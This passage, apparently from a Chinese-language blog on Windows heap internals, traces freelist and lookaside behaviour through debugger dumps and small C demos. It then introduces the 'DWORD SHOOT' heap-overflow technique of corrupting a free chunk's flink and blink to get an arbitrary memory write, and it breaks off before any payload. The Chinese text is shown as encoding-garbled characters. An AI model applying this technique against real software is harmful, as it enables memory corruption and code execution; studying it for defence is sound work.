<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,0,h4); //coalese h3,h4,h5,link the large block to freelist[8]</span><br></pre></td></tr></table></figure>

<p>h4å †å—çš„å¤§å°æ˜¯16å­—èŠ‚(8é¦–éƒ¨+8data),æœ‰å¯èƒ½è¦å’Œå·²ç»é‡Šæ”¾çš„h1,h3è¿›è¡Œåˆå¹¶</p>
<p>æ‰§è¡Œåçš„Freelist</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Freelist[0]@00360178  08 07 36 00 08 07 36 00  6.6.</span><br><span class="line">Freelist[1]@00360180  80 01 36 00 80 01 36 00  â‚¬6.â‚¬6.</span><br><span class="line">Freelist[2]@00360188  88 06 36 00 88 06 36 00  ?6.?6.</span><br><span class="line">Freelist[3]@00360190  90 01 36 00 90 01 36 00  ?6.?6.</span><br><span class="line">Freelist[4]@00360198  98 01 36 00 98 01 36 00  ?6.?6.</span><br><span class="line">Freelist[5]@003601A0  A0 01 36 00 A0 01 36 00  ?6.?6.</span><br><span class="line">Freelist[6]@003601A8  A8 01 36 00 A8 01 36 00  ?6.?6.</span><br><span class="line">Freelist[7]@003601B0  B0 01 36 00 B0 01 36 00  ?6.?6.</span><br><span class="line">Freelist[8]@003601B8  A8 06 36 00 A8 06 36 00  ?6.?6.</span><br></pre></td></tr></table></figure>

<p>ä»h1,3,5é‡Šæ”¾å®Œæˆååˆ°h4é‡Šæ”¾å®Œæˆå,å‘ç”Ÿå˜åŒ–çš„Freelistè®°å½•æœ‰</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Freelist[2]@0x00360188</span><br><span class="line">Freelist[4]@0x00360198</span><br><span class="line">Freelist[8]@0x003601B8</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹å‡ºFreelist[2]åŸæ¥åé¢æŒ‚ç€ä¸¤ä¸ªèŠ‚ç‚¹h1@00360688,h3@003606A8,ç°åœ¨åªå‰©ä¸‹ä¸€ä¸ªh1@0x00360688</p>
<p>Freelist[4]åŸæ¥åé¢æŒ‚ç€h5@003606C8,ç°åœ¨æŒ‡å‘è‡ªå·±äº†,åé¢å•¥ä¹Ÿæ²¡æŒ‚</p>
<p>Freelist[8]åé¢æŒ‚äº†ä¸€ä¸ªH@0x003606A8</p>
<p>ä¹Ÿå°±æ˜¯è¯´æ¶ˆå¤±äº†h3,h5,è¿˜æœ‰ä¸€ä¸ªh4,æ°å¥½ä»–ä»¨æ˜¯é¡ºåºçš„,æ˜¯ä¸æ˜¯Freelist[8]åé¢æŒ‚ç€çš„è¿™ä¸ªå°±æ˜¯å‘¢?å»0x003606A0çœ‹çœ‹è¿™ä¸ªå †å—é¦–éƒ¨</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">003606A0  08 00 02 00 00 00 0A 00  ......</span><br><span class="line">003606A8  B8 01 36 00 B8 01 36 00  ?6.?6.</span><br></pre></td></tr></table></figure>



<p>SelfSize&#x3D;0x0008(å•ä½8å­—èŠ‚),å³64å­—èŠ‚</p>
<p>Flags&#x3D;0,ç©ºé—²çŠ¶æ€</p>
<p>å‰æŒ‡é’ˆFreelist[8]@0x3601B8,</p>
<p>åæŒ‡é’ˆFreelist[8]@0x3601B8</p>
<p>è€Œh3,4éƒ½æ˜¯8+8&#x3D;16çš„å †å—,h5æ˜¯8+24&#x3D;32çš„å †å—,åˆèµ·æ¥æ­£å¥½æ˜¯64å­—èŠ‚</p>
<p>è¿™è¯æ˜Freelist[8]ä¸ŠæŒ‚ç€çš„å°±æ˜¯h3,4,5åˆå¹¶èµ·æ¥çš„å †å—</p>
<h3 id="è°ƒè¯•è§‚å¯Ÿå¿«è¡¨"><a href="#è°ƒè¯•è§‚å¯Ÿå¿«è¡¨" class="headerlink" title="è°ƒè¯•è§‚å¯Ÿå¿«è¡¨"></a>è°ƒè¯•è§‚å¯Ÿå¿«è¡¨</h3><p>è¯å¼•å­é•¿è¿™æ ·</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1,h2,h3,h4;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">	__asm <span class="type">int</span> <span class="number">3</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h4);</span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h2);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>ä¸è°ƒè¯•ç©ºè¡¨æ—¶çš„åŒºåˆ«å°±åœ¨HeapCreateå‡½æ•°è¿™é‡Œ</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);<span class="comment">//è°ƒè¯•ç©ºè¡¨æ—¶</span></span><br><span class="line">hp = HeapCreate(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);<span class="comment">//è°ƒè¯•å¿«è¡¨æ—¶</span></span><br></pre></td></tr></table></figure>

<p><code>HeapCreate(0,0,0);</code>è¿™æ ·æ‰èƒ½å¯ç”¨å¿«è¡¨</p>
<h4 id="call-HeapCreate"><a href="#call-HeapCreate" class="headerlink" title="call HeapCreate"></a>call HeapCreate</h4><p>è°ƒç”¨HeapCreateä¹‹å,è¿”å›å€¼å †åŒºå¥æŸ„eax&#x3D;0x360000</p>
<p>æ­¤æ—¶çš„ç©ºè¡¨Freelistå’Œä¹‹å‰ä¸ä¸€æ ·äº†,Freelist[0]@0x00360178æŒ‚ç€çš„å°¾å—åœ¨0x00361E90äº†,åŸæ¥æ˜¯åœ¨0x360688</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920110236696.png" alt="image-20220920110236696"></p>
<h4 id="ä»å°¾å—åˆ†é…"><a href="#ä»å°¾å—åˆ†é…" class="headerlink" title="ä»å°¾å—åˆ†é…"></a>ä»å°¾å—åˆ†é…</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);<span class="comment">//å¸Œæœ›ä»hpå †ç”³è¯·8å­—èŠ‚ç©ºé—´,åˆå§‹åŒ–ä¸º0</span></span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€æ¡æ‰§è¡Œä¹‹å,è¿”å›çš„å †ç©ºé—´å¥æŸ„eax&#x3D;0x361E90,åˆ°è¿™é‡Œçœ‹çœ‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920112928353.png" alt="image-20220920112928353"></p>
<p>0x361E88å¼€å§‹çš„å…«ä¸ªå­—èŠ‚æ˜¯å †å—é¦–</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/head.png" alt="head"></p>
<p>selfsize&#x3D;0x0002(å•ä½8å­—èŠ‚),å³å †å—é¦–åŠ ä¸Šdataå…±16å­—èŠ‚</p>
<p>Flag&#x3D;0x01,å·²å ç”¨</p>
<p>unused bytes&#x3D;8,æœ‰8å­—èŠ‚å°šæœªä½¿ç”¨</p>
<blockquote>
<p>æ­¤æ—¶Freelist[0]æŒ‡å‘çš„å°¾å—ä¹Ÿå‘ç”Ÿäº†å˜åŒ–</p>
<p>Freelist[0]@0x00360178</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920122010974.png" alt="image-20220920122010974"></p>
<p>å°¾å—åŸæ¥åœ¨0x00361E90,ç°åœ¨ä¸‹ç§»åˆ°äº†0x00361EA0</p>
</blockquote>
<p>è¯´æ˜åˆšæ‰çš„å †å—ä»ç„¶æ˜¯ä»å°¾å—ä¸Šå‰²å‡ºå»çš„</p>
<p>å½“å››æ¡HeapAllocéƒ½æ‰§è¡Œå®Œæˆä¹‹å</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br><span class="line">h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">24</span>);</span><br></pre></td></tr></table></figure>

<p>ä¸‹é¢å°±åˆ°äº†HeapFreeäº†,æ­¤æ—¶å°±å’Œä¹‹å‰ä¸åŒäº†</p>
<h4 id="ä½†æ˜¯è¿˜ç»™å¿«è¡¨"><a href="#ä½†æ˜¯è¿˜ç»™å¿«è¡¨" class="headerlink" title="ä½†æ˜¯è¿˜ç»™å¿«è¡¨"></a>ä½†æ˜¯è¿˜ç»™å¿«è¡¨</h4><p>è°ƒè¯•ç©ºè¡¨æ—¶,HeapAllocç”³è¯·çš„ç©ºé—´,ä½¿ç”¨HeapFreeä¹‹åä¼šå½’ç»™è¿˜åˆ°ç©ºè¡¨,å¹¶ä¸”ç›¸é‚»çš„å †å—è¿˜ä¼šè¿›è¡Œåˆå¹¶</p>
<p>è€Œæœ¬æ¬¡è°ƒè¯•,HeapAllocç”³è¯·çš„ç©ºé—´,å°†ä¼šè¿˜ç»™å¿«è¡¨</p>
<h5 id="é‡Šæ”¾h1-1"><a href="#é‡Šæ”¾h1-1" class="headerlink" title="é‡Šæ”¾h1"></a>é‡Šæ”¾h1</h5><p>ç¬¬ä¸€æ¬¡é‡Šæ”¾çš„æ—¶h1@0x361E90</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,<span class="number">0</span>,h1);</span><br></pre></td></tr></table></figure>

<p>åˆ°0x361E90çœ‹çœ‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920142559502.png" alt="image-20220920142559502"></p>
<p>self size&#x3D;0x02,å³16å­—èŠ‚</p>
<p>flags&#x3D;0x01,å› ä¸ºå¿«è¡¨ä¸­çš„èŠ‚ç‚¹éƒ½æ ‡è®°ä¸ºå·²å ç”¨</p>
<p>unused bytes&#x3D;0x08æœªä½¿ç”¨å­—èŠ‚æ•°</p>
<p>å†åˆ°å¿«è¡¨çœ‹çœ‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920143027699.png" alt="image-20220920143027699"></p>
<p>Lookaside[1]@0x3606E8æ­¤æ—¶å…¶ä¸Šçš„æŒ‡é’ˆä¸º0x00361E90,æ­£å¥½å°±æ˜¯åˆšæ‰é‡Šæ”¾çš„h1@0x00361E90</p>
<h5 id="é‡Šæ”¾h2"><a href="#é‡Šæ”¾h2" class="headerlink" title="é‡Šæ”¾h2"></a>é‡Šæ”¾h2</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HeapFree(hp,<span class="number">0</span>,h2);</span><br></pre></td></tr></table></figure>

<p>h2å’Œh1ä¸€æ ·éƒ½æ˜¯8å­—èŠ‚å †é¦–+8å­—èŠ‚data,å¹¶ä¸”ä¸¤è€…çš„åœ°å€ç›¸é‚»,é‡Šæ”¾h2ä¹‹åä¼šä¸ä¼šå‘ç”Ÿå †å—åˆå¹¶å‘¢?å¿«è¡¨æ²¡è¿™ä¸ªèƒ½åŠ›</p>
<p>æ‰§è¡Œä¹‹åLookaside[1]@0x3606E8æŒ‡å‘h2@0x361EA0äº†,åŸæ¥æ˜¯æŒ‡å‘h1@0x00361E90çš„</p>
<p>è¿™å°±çº³é—·äº†,h1@0x00361E90è¿™ä¸ªå †å—ç›®å‰è¢«è°ç´¢å¼•ç€å‘¢?æ‰¾ä¸åˆ°å®ƒä¸å°±å†…å­˜æ³„æ¼äº†å—</p>
<p>åˆ°h2@0x361EA0çœ‹çœ‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920150733600.png" alt="image-20220920150733600"></p>
<p>åŸæ¥æ˜¯h2æŒ‡å‘äº†h1</p>
<p>ç›®å‰å¿«è¡¨æ˜¯è¿™æ ·ä¸€ä¸ªçŠ¶æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920151907615.png" alt="image-20220920151907615"></p>
<p>h1çš„æŒ‡é’ˆå ç”¨äº†h2dataçš„å‰4ä¸ªå­—èŠ‚,ä½†æ˜¯æ²¡å…³ç³»,å†ç”³è¯·8å­—èŠ‚çš„å †ç©ºé—´çš„æ—¶å€™,ç›´æ¥ä»Lookaside[1]æ‹‰çš„é“¾ä¸ŠæŠŠæœ€åé¢ä¸€ä¸ªæ‘˜ä¸‹æ¥,å‰é¢çš„dataå°±ä¸ç”¨å­˜æœ€åè¿™ä¸ªçš„æŒ‡é’ˆäº†</p>
<h4 id="å››æ¬¡é‡Šæ”¾å®Œæ¯•å"><a href="#å››æ¬¡é‡Šæ”¾å®Œæ¯•å" class="headerlink" title="å››æ¬¡é‡Šæ”¾å®Œæ¯•å"></a>å››æ¬¡é‡Šæ”¾å®Œæ¯•å</h4><p>å°†ä»å°¾å—ä¸Šå‰²ä¸‹æ¥çš„h1,2,3,4éƒ½é‡Šæ”¾äº†,ä»–ä»¬éƒ½ä¼šæŒ‚åœ¨lookasideä¸Š</p>
<p>ç”»åˆ°å›¾ä¸Šæ˜¯è¿™æ ·çš„</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152300952.png" alt="image-20220920152300952"></p>
<h4 id="ä»å¿«è¡¨åˆ†é…"><a href="#ä»å¿«è¡¨åˆ†é…" class="headerlink" title="ä»å¿«è¡¨åˆ†é…"></a>ä»å¿«è¡¨åˆ†é…</h4><p>å››æ¬¡åˆ†é…é‡Šæ”¾å®Œæˆå,å®é™…ä¸Šå¹²äº†ä¸€ä¸ªç“œåˆ†å°¾å—åˆ°å¿«è¡¨çš„äº‹,ä¸‹é¢åˆè¦è¿›è¡Œåˆ†é…äº†</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">16</span>);</span><br></pre></td></tr></table></figure>

<p>16å­—èŠ‚,æ­£å¥½Lookaside[2]ä¸Šé¢æŒ‚ç€ä¸€ä¸ªh3@361EB0,è¿™ä¸ªå¹¸è¿å„¿åˆè¦å¾—åˆ°ç¨‹åºçš„é‡ç”¨äº†</p>
<p>ä¸å‡ºæ‰€æ–™,è°ƒç”¨HeapAllocå‡½æ•°,è¿”å›ä¹‹å,eaxä¸­çš„å¥æŸ„å€¼ä¸º0x361EB0</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152553906.png" alt="image-20220920152553906"></p>
<p>åˆ°è¿™é‡Œå»çœ‹çœ‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152632807.png" alt="image-20220920152632807"></p>
<p>SelfSize&#x3D;0x0003(å•ä½8å­—èŠ‚),å³å †å—é¦–8å­—èŠ‚+data16å­—èŠ‚&#x3D;24å­—èŠ‚</p>
<p>flags&#x3D;0x01,å ç”¨çŠ¶æ€</p>
<p>å†åˆ°Lookaside[2]@0x360718çœ‹çœ‹</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920152821163.png" alt="ä¸€å¤œå›åˆ°è§£æ”¾å‰"></p>
<p>Lookaside[1]@3606E8è¿˜æœ‰Lookaside[3]@360748éƒ½æ²¡æœ‰å‘ç”Ÿå˜åŒ–,å”¯ç‹¬Lookaside[2]@0x360718ä¸€å¤œå›åˆ°è§£æ”¾å‰äº†</p>
<h2 id="å †æº¢å‡º"><a href="#å †æº¢å‡º" class="headerlink" title="å †æº¢å‡º"></a>å †æº¢å‡º</h2><p>finally,å¯ä»¥æç‚¹äº‹æƒ…äº†</p>
<h3 id="DWORD-SHOOT"><a href="#DWORD-SHOOT" class="headerlink" title="DWORD SHOOT"></a>DWORD SHOOT</h3><p>â€œåŒå­—å°„å‡»â€</p>
<p>æ„é€ æ•°æ®,æº¢å‡ºä¸‹ä¸€ä¸ªå †å—çš„å—é¦–,æ”¹å†™è¯¥å †å—ä¸­çš„å‰å‘æŒ‡é’ˆflink,åå‘æŒ‡é’ˆblink,åœ¨åˆ†é…,é‡Šæ”¾,åˆå¹¶ç­‰æ“ä½œæ—¶å¸æœºè·å¾—ä¸€æ¬¡æƒ³å†…å­˜ä»»æ„åœ°å€å†™å…¥ä»»æ„æ•°æ®çš„æœºä¼š</p>
<p>ä¸ºå•¥å«åšâ€DWORD SHOOTâ€å‘¢?</p>
<p>â€œDWORDâ€æ˜¯å› ä¸ºæ”»å‡»è´Ÿè½½æ˜¯ä¸€ä¸ªåŒå­—,åé¢å°±çœ‹åˆ°äº†</p>
<p>â€œSHOOTâ€æ˜¯å› ä¸ºè¿™ç§æ”»å‡»ç±»ä¼¼äºç‹™å‡»,åªæœ‰ä¸€æ¬¡æœºä¼š,ä¸æ˜¯æ ˆæº¢å‡ºçš„å¤§æ°´æ¼«çŒ</p>
<p><strong>å¦‚ä½•å‘ç”Ÿ?</strong></p>
<p>è€ƒè™‘æˆ‘ä»¬è‡ªå·±å†™ä¸€ä¸ªåŒå‘çš„é“¾è¡¨ADTæ—¶,é‡Šæ”¾å…¶ä¸­ä¸€ä¸ªèŠ‚ç‚¹åº”è¯¥æ€ä¹ˆå†™?</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920154638925.png" alt="image-20220920154638925"></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Node</span>&#123;</span></span><br><span class="line">	Node *flink;</span><br><span class="line">	Node *blink;</span><br><span class="line">    <span class="type">int</span> data;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">delet</span><span class="params">(Node *node)</span>&#123;</span><br><span class="line">    node-&gt;blink-&gt;flink=node-&gt;flink;<span class="comment">//åèŠ‚ç‚¹çš„å‰æŒ‡é’ˆæŒ‡å‘å½“å‰èŠ‚ç‚¹çš„å‰èŠ‚ç‚¹</span></span><br><span class="line">    node-&gt;flink-&gt;blink=node-&gt;flink;<span class="comment">//å‰èŠ‚ç‚¹çš„åæŒ‡é’ˆæŒ‡å‘å½“å‰èŠ‚ç‚¹çš„åèŠ‚ç‚¹</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åç¯¡æ”¹nodeèŠ‚ç‚¹çš„å‰åæŒ‡é’ˆ</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920155918456.png" alt="image-20220920155918456"></p>
<p>ç„¶è€Œè¿™éƒ½æ˜¯çŒœæƒ³,windowså¼€å‘è€…æ€ä¹ˆå†™çš„ç°åœ¨æˆ‘ä»¬ä¸çŸ¥é“,ä¸‹é¢è°ƒè¯•è§‚å¯Ÿæ˜¯ä¸æ˜¯è¿™æ ·</p>
<h3 id="è°ƒè¯•åˆ†é…æ—¶DWORD-SHOOT"><a href="#è°ƒè¯•åˆ†é…æ—¶DWORD-SHOOT" class="headerlink" title="è°ƒè¯•åˆ†é…æ—¶DWORD SHOOT"></a>è°ƒè¯•åˆ†é…æ—¶DWORD SHOOT</h3><p>è°ƒè¯•ç¨‹åºæ˜¯è¿™æ ·çš„</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	HLOCAL h1, h2,h3,h4,h5,h6;</span><br><span class="line">	HANDLE hp;</span><br><span class="line">	hp = HeapCreate(<span class="number">0</span>,<span class="number">0x1000</span>,<span class="number">0x10000</span>);<span class="comment">//ä¸€å¼€å§‹æ—¶ç”³è¯·0x1000ä¸ªå­—èŠ‚çš„å †ç©ºé—´,æœ€å¤§èƒ½å¤Ÿç”³è¯·0x10000ä¸ªå­—èŠ‚</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);<span class="comment">//å¸Œæœ›ç”³è¯·8ä¸ªå­—èŠ‚,å®é™…ä¸Šä»å°¾å—ç“œåˆ†16å­—èŠ‚ç©ºé—´</span></span><br><span class="line">	h2 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h3 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h4 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h5 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);</span><br><span class="line">	h6 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>);<span class="comment">//è¿ç»­ä»å°¾å—ä¸Šç“œåˆ†16*6=96å­—èŠ‚ç©ºé—´</span></span><br><span class="line"></span><br><span class="line">	_asm <span class="type">int</span> <span class="number">3</span>	<span class="comment">//used to break the process//åœ¨æ­¤ä¸­æ–­é™„åŠ è°ƒè¯•å™¨</span></span><br><span class="line">	<span class="comment">//free the odd blocks to prevent coalesing</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h1); <span class="comment">//é‡Šæ”¾å¥‡æ•°å—,é¿å…åˆå¹¶</span></span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h3); </span><br><span class="line">	HeapFree(hp,<span class="number">0</span>,h5); <span class="comment">//now freelist[2] got 3 entries//ç°åœ¨ç©ºè¡¨freelist[2]åé¢æ‰˜ç€3æ²¹ç“¶</span></span><br><span class="line">    <span class="comment">//åæ¥çš„ç›´æ¥å¤´æ’æ³•æ¥åˆ°freelist[2]åé¢,åæ¥çš„å…ˆåˆ†é…</span></span><br><span class="line">	</span><br><span class="line">	<span class="comment">//will allocate from freelist[2] which means unlink the last entry (h5)</span></span><br><span class="line">	h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,<span class="number">8</span>); <span class="comment">//å†ç”³è¯·8å­—èŠ‚,è¦æŠŠåˆšæ‰é‡Šæ”¾çš„h5è¦å›æ¥</span></span><br><span class="line">		</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>åœ¨win2kä¸Š,å‘è¡Œç‰ˆçš„ç¨‹åºåœ¨INT3ä¹‹åæŠ¥é”™,æ­¤æ—¶é™„åŠ odè¿›è¡Œè°ƒè¯•</p>
<h4 id="å…­æ¬¡HeapAllocä¹‹å"><a href="#å…­æ¬¡HeapAllocä¹‹å" class="headerlink" title="å…­æ¬¡HeapAllocä¹‹å"></a>å…­æ¬¡HeapAllocä¹‹å</h4><p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920161251631.png" alt="image-20220920161251631"></p>
<p>æ­¤æ—¶ç¨‹åºåˆšæ‰§è¡Œäº†æœ€åä¸€ä¸ªHeapAlloc,eaxä¸­è¿˜ä¿å­˜ç€å¥æŸ„h6&#x3D;0x5206D8</p>
<p>å¯ä»¥æ¨æµ‹,å †åŒºåœ¨0x520000,åœ¨å†…å­˜æ˜ å°„è§†å›¾ä¸­è§‚å¯Ÿ,ç¡®å®å¦‚æ­¤</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920161424952.png" alt="image-20220920161424952"></p>
<p>6æ¬¡HeapAllocéƒ½æ˜¯ç“œåˆ†çš„å°¾å—</p>
<p>å°¾å—ç°åœ¨çš„ä½ç½®åº”è¯¥æ˜¯ä½äºh6çš„ä¸‹é¢</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920161542418.png" alt="image-20220920161542418"></p>
<p>h6å—é¦–@0x5206D0</p>
<p>h6data@0x5206D8</p>
<p>ç¡®å®å¦‚æ­¤,å°¾å—@0x526E8,ä¸¤ä¸ªæŒ‡é’ˆéƒ½æ˜¯æŒ‡å‘Freelist[0]@0x520178</p>
<p>å°¾å—é¦–@0x5206E0.</p>
<h4 id="h1-3-5é‡Šæ”¾ä¹‹å"><a href="#h1-3-5é‡Šæ”¾ä¹‹å" class="headerlink" title="h1,3,5é‡Šæ”¾ä¹‹å"></a>h1,3,5é‡Šæ”¾ä¹‹å</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Freelist[0]@00520178  E8 06 52 00 E8 06 52 00  ?R.?R.</span><br><span class="line">Freelist[1]@00520180  80 01 52 00 80 01 52 00  â‚¬R.â‚¬R.</span><br><span class="line">Freelist[2]@00520188  88 06 52 00 C8 06 52 00  ?R.?R.</span><br><span class="line">Freelist[3]@00520190  90 01 52 00 90 01 52 00  ?R.?R.</span><br><span class="line">Freelist[4]@00520198  98 01 52 00 98 01 52 00  ?R.?R.</span><br><span class="line">Freelist[5]@005201A0  A0 01 52 00 A0 01 52 00  ?R.?R.</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­Freelist[0]ä¸¤ä¸ªæŒ‡é’ˆéƒ½æŒ‡å‘å°¾å—,</p>
<p>Freelist[2].flink&#x3D;h1@0x00520688</p>
<p>Freelist[2].blink&#x3D;h5@0x005206C8</p>
<p>åœ¨å›¾ä¸Šå°±æ˜¯è¿™ä¹ˆä¸€ä¸ªçŠ¶æ€</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220920162635151.png" alt="image-20220920162635151"></p>
<h4 id="ç¯¡æ”¹h5çš„ä¸¤ä¸ªæŒ‡é’ˆ"><a href="#ç¯¡æ”¹h5çš„ä¸¤ä¸ªæŒ‡é’ˆ" class="headerlink" title="ç¯¡æ”¹h5çš„ä¸¤ä¸ªæŒ‡é’ˆ"></a>ç¯¡æ”¹h5çš„ä¸¤ä¸ªæŒ‡é’ˆ</h4><p>ä¸‹ä¸€æ¬¡åˆ†é…<code>h1 = HeapAlloc(hp,HEAP_ZERO_MEMORY,8); </code>å°†ä¼šæŠŠåˆšæ‰é‡Šæ”¾çš„h5@0x005206C8å†è¦å›å»,</p>
<p>åœ¨è¦å›å»ä¹‹å‰è¦ä¿®æ”¹h3è¿˜æœ‰Freelist[2]çš„æŒ‡é’ˆ</p>
